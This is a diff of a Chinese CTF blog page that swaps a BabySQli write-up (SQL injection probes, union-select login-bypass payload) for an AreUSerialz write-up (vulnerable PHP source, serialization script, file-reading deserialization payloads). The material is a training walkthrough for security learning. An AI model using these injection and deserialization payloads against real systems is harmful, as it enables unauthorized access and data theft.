@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题023 - lll-nnnのblog</title>
+  <title>BUU每日一题024 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题023">
+            <span class="h2" id="subtitle" title="BUU每日一题024">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-02-06 15:52" pubdate>
-        2021年2月6日 下午
+      <time datetime="2021-02-07 23:18" pubdate>
+        2021年2月7日 晚上
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      267 字
+      652 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      11
        分钟
     </span>
   
@@ -224,20 +224,120 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题023</h1>
+            <h1 style="display: none">BUU每日一题024</h1>
             
             <div class="markdown-body">
-              <h2 id="二十三、"><a href="#二十三、" class="headerlink" title="二十三、"></a>二十三、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[GXYCTF2019]BabySQli<br><img src="https://ftp.bmp.ovh/imgs/2021/02/882964df2e56c968.png" srcset="/img/loading.gif">  </p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>name=admin&amp;pw=123</code>———–<code>wrong pass!</code><br><code>name=admin&#39;&amp;pw=123</code>———-<code>报错</code><br><code>name=admin&amp;pw=1&#39;</code>————<code>wrong pass!</code><br>说明<code>name</code>存在注入，<code>pw</code>不存在<br>在<code>search.php</code>页面源码注释中发现：<br><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code><br>base32然后base64解码得到SQL语句<br><code>select * from user where username = &#39;$name&#39;</code><br><code>or、=、(、)</code>被过滤，但OR可以<br><code>admin&#39; Order by 4#</code>———<code>Error: Unknown column &#39;4&#39; in &#39;order clause&#39; </code>说明有三列<br><code>1&#39; union select 1,2,3#</code>看回显位，结果是<code>wrong user!</code><br>将1改为<code>&#39;admin&#39;</code>,还是wrong user；改到第二位，变成了wrong pass，说明admin在第二列       </p>
+              <h2 id="二十四、"><a href="#二十四、" class="headerlink" title="二十四、"></a>二十四、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[网鼎杯 2020 青龙组]AreUSerialz   </p>
+<pre><code>&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler &#123;
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() &#123;
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    &#125;
+
+    public function process() &#123;
+        if($this-&gt;op == &quot;1&quot;) &#123;
+            $this-&gt;write();
+        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        &#125;
+    &#125;
+
+    private function write() &#123;
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
+            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            &#125;
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Failed!&quot;);
+        &#125;
+    &#125;
+
+    private function read() &#123;
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) &#123;
+            $res = file_get_contents($this-&gt;filename);
+        &#125;
+        return $res;
+    &#125;
+
+    private function output($s) &#123;
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    &#125;
+
+    function __destruct() &#123;
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    &#125;
+
+&#125;
+
+function is_valid($s) &#123;
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+&#125;
+
+if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+
+    $str = (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) &#123;
+        $obj = unserialize($str);
+    &#125;
+
+&#125;    </code></pre>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一大段代码，很可怕<br>通过<code>read()</code>函数中的<code>file_get_contents</code>和<code>process()</code>函数中的<code> $this-&gt;output($res);</code><br>我们应该利用这个读取到<code>flag.php</code><br>传一个序列化的$str,filename=flag.php,调用read()函数需要op==”2”;而析构函数里有个</p>
+<pre><code>if($this-&gt;op === &quot;2&quot;)
+     $this-&gt;op = &quot;1&quot;;     </code></pre>
+<p>所以不能使<code>op===&quot;2&quot;</code>成立，运用弱类型让<code>op=2</code>即可          </p>
+<pre><code>function is_valid($s) &#123;
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+&#125;    </code></pre>
+<p>这个要求$str的ASCII码必须在32~125之间<br>protected类在序列化后含有%00，其ASCII码为0<br>PHP7.1以上版本对属性类型不敏感，所以可以改成public类绕过       </p>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><pre><code>&lt;?php 
+class FileHandler &#123;
+
+    public $op=2;
+    public $filename=&quot;flag.php&quot;;
+    public $content=&quot;hello&quot;;
+
+&#125;
+    $a=new FileHandler();
+    $b=serialize($a);
+    echo $b;
+?&gt;          </code></pre>
+<p>payload：<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;hello&quot;;&#125;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/7fca77026da21ca9.png" srcset="/img/loading.gif">  </p>
 <hr>
-<p>在BUU给的这道题的源码中<img src="https://ftp.bmp.ovh/imgs/2021/02/0eafd76c74fd6cb3.png" srcset="/img/loading.gif"><br><code>arr[1]==&#39;admin&#39;</code>那么<code>arr[2]</code>应该就是输入的pw吧<br>需要<code>md5($password) == $arr[2]</code><br>所以只要传入的pw的MD5等于第三位就行了 </p>
+<p>也可以使用伪协议  </p>
+<pre><code>public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;     </code></pre>
 <hr>
-<p>如果没有源码的提示，正确的思路应该是利用sql的特性：<code>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</code>     </p>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code>&amp;&amp;<code>pw=123</code><img src="https://ftp.bmp.ovh/imgs/2021/02/dee35a5c0bf7263c.png" srcset="/img/loading.gif">        </p>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><code>sql特性</code>     </p>
-<blockquote>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/02/0b5f477cb43f3a6c.png" srcset="/img/loading.gif"><br><img src="https://ftp.bmp.ovh/imgs/2021/02/0c57b06eb2a85b33.png" srcset="/img/loading.gif"></p>
-</blockquote>
+<p>或者<br>不改类型，还是protected<br>将序列化后的字节流中用大写S表示表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，就可以将<code>%00</code>替换为<code>\00</code><br>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;s:5:&quot;hello&quot;;&#125;</code></p>
 
             </div>
             <hr>
@@ -261,18 +361,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/02/07/BUU024/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题024</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/02/05/ctfhub/">
-                        <span class="hidden-mobile">Ctfhub</span>
+                      <a href="/2021/02/06/BUU023/">
+                        <span class="hidden-mobile">BUU每日一题023</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
